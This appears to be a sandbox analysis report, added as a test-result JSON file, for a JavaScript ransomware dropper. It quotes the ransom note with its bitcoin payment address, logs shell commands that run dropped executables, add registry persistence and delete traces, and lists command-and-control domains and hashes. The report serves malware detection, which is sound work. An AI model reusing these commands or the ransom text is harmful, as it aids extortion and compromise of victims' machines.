@@ -1,0 +1,692 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 1164,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "Sample consists of a long single line of code",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 10,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Long One-Liner",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Signatures",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript writes data to the console\n\t\tTextStream[20].WriteLine(ATTENTION!)\n\n\t\tTextStream[20].WriteLine()\n\n\t\tTextStream[20].WriteLine(All your documents, photos, databases and other important personal files)\n\n\t\tTextStream[20].WriteLine(were encrypted using strong RSA-1024 algorithm with a unique key.)\n\n\t\tTextStream[20].WriteLine(To restore your files you have to pay 0.51130 BTC (bitcoins).)\n\n\t\tTextStream[20].WriteLine(Please follow this manual:)\n\n\t\tTextStream[20].WriteLine(1. Create Bitcoin wallet here:)\n\n\t\tTextStream[20].WriteLine(      https://blockchain.info/wallet/new)\n\n\t\tTextStream[20].WriteLine(2. Buy 0.51130 BTC with cash, using search here:)\n\n\t\tTextStream[20].WriteLine(      https://localbitcoins.com/buy_bitcoins)\n\n\t\tTextStream[20].WriteLine(3. Send 0.51130 BTC to this Bitcoin address:)\n\n\t\tTextStream[20].WriteLine(      1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n\n\t\tTextStream[20].WriteLine(4. Open one of the following links in your browser to download decryptor:)\n\n\t\tTextStream[20].WriteLine(      http://projectdare.co.uk/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYC...\n\t\tTextStream[20].WriteLine(      http://hotel.internetdsl.pl/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiK...\n\t\tTextStream[20].WriteLine(      http://tt-metall.ru/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n\n\t\tTextStream[20].WriteLine(      http://www.wordbaasoverdebal.nl/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDH...\n\t\tTextStream[20].WriteLine(      http://tintssori.com.mialias.net/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbD...\n\t\tTextStream[20].WriteLine(5. Run decryptor to restore your files.)\n\n\t\tTextStream[20].WriteLine(PLEASE REMEMBER:)\n\n\t\tTextStream[20].WriteLine(      - If you do not pay in 3 days YOU LOOSE ALL YOUR FILES.)\n\n\t\tTextStream[20].WriteLine(      - Nobody can help you except us.)\n\n\t\tTextStream[20].WriteLine(      - It`s useless to reinstall Windows, update antivirus software, etc.)...\n\t\tTextStream[20].WriteLine(      - Your files can be decrypted only after you make payment.)\n\n\t\tTextStream[20].WriteLine(      - You can find this manual on your desktop (DECRYPT.txt).)\n\n\t\tTextStream[21].WriteLine(1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "console_output": 10
+          },
+          "signatures": {
+            "console_output": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: ConsoleOutput",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates an object representing a hard drive\n\t\tnew DriveObject[18](C:)\n\n\t\tDriveObject[18](C:).name = (string) 'C:'\n\n\t\tnew Collection[19]([?  {?    id: 18,?    _name: 'DriveObject[18](C:)',?    _availablespace: '',?    ...",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "drive_object": 10
+          },
+          "signatures": {
+            "drive_object": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: DriveObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript looks at the environment strings\n\t\tWScript.Shell[14].ExpandEnvironmentStrings(%TEMP%) => C:\\Users\\User\\AppData\\Local\\Temp\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 250,
+          "score_map": {
+            "env_str_recon": 250
+          },
+          "signatures": {
+            "env_str_recon": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: ExpandEnvStrings",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tWScript.CreateObject(Scripting.FileSystemObject)\n\n\t\tnew Scripting.FileSystemObject[17]\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.txt) => false\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe) => true\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll) => true\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.php) => true\n\n\t\tScripting.FileSystemObject[17].CreateTextFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.txt, true, undefine...\n\t\tScripting.FileSystemObject[17].CreateTextFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.php, true, undefine...",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {
+            "file_system_object": 100
+          },
+          "signatures": {
+            "file_system_object": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: FileSystemObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCR\\Crypted\\shell\\open\\command\" /ve /t REG_SZ /F /D \"no...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c C:\\Users\\User\\AppData\\Local\\Temp\\a.exe \"C:\\Users\\User\\AppData\\Loc...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c notepad.exe \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.exe\", 0, 0)\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "runs_executable": 500
+          },
+          "signatures": {
+            "runs_executable": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: RunsExecutable",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCR\\.crypted\" /ve /t REG_SZ /F /D \"Crypted\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCR\\Crypted\\shell\\open\\command\" /ve /t REG_SZ /F /D \"no...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c copy /y \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\" \"%AppData%\\Deskt...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c copy /y \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\" \"%UserProfile%\\D...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c C:\\Users\\User\\AppData\\Local\\Temp\\a.exe \"C:\\Users\\User\\AppData\\Loc...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c notepad.exe \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.php\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.exe\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll\", 0, 0)\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript writes data to disk\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.php, 2)\n\n\t\t    \t   \t  var xnkt = 'xa.saveToFile'\n\t\t    \t   \t  var bczr = '.saveToFile('",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "save_to_file": 10
+          },
+          "signatures": {
+            "save_to_file": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: SaveToFile",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript writes executable file to disk\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll, 2)\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 250,
+          "score_map": {
+            "writes_executable": 250
+          },
+          "signatures": {
+            "writes_executable": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: WritesExecutable",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript uses a suspicious process\n\t\t eval(s37)",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "suspicious_process": 10
+          },
+          "signatures": {
+            "suspicious_process": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: SuspiciousProcess",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"projectdare.co.uk\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=01\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=01\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=02\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=02\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=03\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=03\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=04\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=04\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=05\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=05\"}, {\"ioc_type\": \"domain\", \"ioc\": \"blockchain.info\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://blockchain.info/wallet/new\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/wallet/new\"}, {\"ioc_type\": \"domain\", \"ioc\": \"localbitcoins.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://localbitcoins.com/buy_bitcoins\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/buy_bitcoins\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://projectdare.co.uk/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs\"}, {\"ioc_type\": \"domain\", \"ioc\": \"hotel.internetdsl.pl\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://hotel.internetdsl.pl/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs\"}, {\"ioc_type\": \"domain\", \"ioc\": \"tt-metall.ru\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://tt-metall.ru/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs\"}, {\"ioc_type\": \"domain\", \"ioc\": \"www.wordbaasoverdebal.nl\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://www.wordbaasoverdebal.nl/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs\"}, {\"ioc_type\": \"domain\", \"ioc\": \"tintssori.com.mialias.net\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://tintssori.com.mialias.net/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "projectdare.co.uk",
+                "blockchain.info",
+                "localbitcoins.com",
+                "hotel.internetdsl.pl",
+                "tt-metall.ru",
+                "www.wordbaasoverdebal.nl",
+                "tintssori.com.mialias.net"
+              ],
+              "uri": [
+                "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=01",
+                "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=02",
+                "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=03",
+                "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=04",
+                "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=05",
+                "https://blockchain.info/wallet/new",
+                "https://localbitcoins.com/buy_bitcoins",
+                "http://projectdare.co.uk/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs",
+                "http://hotel.internetdsl.pl/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs",
+                "http://tt-metall.ru/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs",
+                "http://www.wordbaasoverdebal.nl/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs",
+                "http://tintssori.com.mialias.net/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+              ],
+              "uri_path": [
+                "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=01",
+                "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=02",
+                "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=03",
+                "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=04",
+                "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=05",
+                "/wallet/new",
+                "/buy_bitcoins",
+                "/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"url\": \"http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=01\", \"method\": \"GET\"}, {\"url\": \"http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=02\", \"method\": \"GET\"}, {\"url\": \"http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=03\", \"method\": \"GET\"}, {\"url\": \"http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=04\", \"method\": \"GET\"}, {\"url\": \"http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=05\", \"method\": \"GET\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "dynamic": {
+              "domain": [
+                "projectdare.co.uk"
+              ],
+              "uri": [
+                "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=01",
+                "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=02",
+                "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=03",
+                "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=04",
+                "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=05"
+              ],
+              "uri_path": [
+                "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=01",
+                "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=02",
+                "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=03",
+                "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=04",
+                "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=05"
+              ]
+            }
+          }
+        },
+        "title_text": "URLs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "\t\tAn unsafe statement was found: eval",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "JS-X-Ray IOCs Detected",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "C__Users_User_AppData_Local_Temp_a.php",
+        "sha256": "6c1a30c9aa59ecc23b8f130618ecdd42105e0bb79545881036bb3614af548196"
+      },
+      {
+        "name": "extracted_wscript.bat",
+        "sha256": "74bf4a4a343c5cf4c15ee74ec62731b42a9ecf1026ad8840880acc952c3b7d85"
+      },
+      {
+        "name": "C__Users_User_AppData_Local_Temp_a.txt",
+        "sha256": "d282cc2987a29a1a6be1f9416b8d4e7ec1ed3f8913cc40ca2fe03559a4343ac5"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "temp_javascript.js",
+        "sha256": "793de99a32f945017d93aaf0bafae505f67e4746dee5398458b6da8acc49c1be"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "console_output"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "drive_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "env_str_recon"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "file_system_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_executable"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "save_to_file"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "writes_executable"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "suspicious_process"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 10,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "network.dynamic.domain": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "projectdare.co.uk"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=01"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
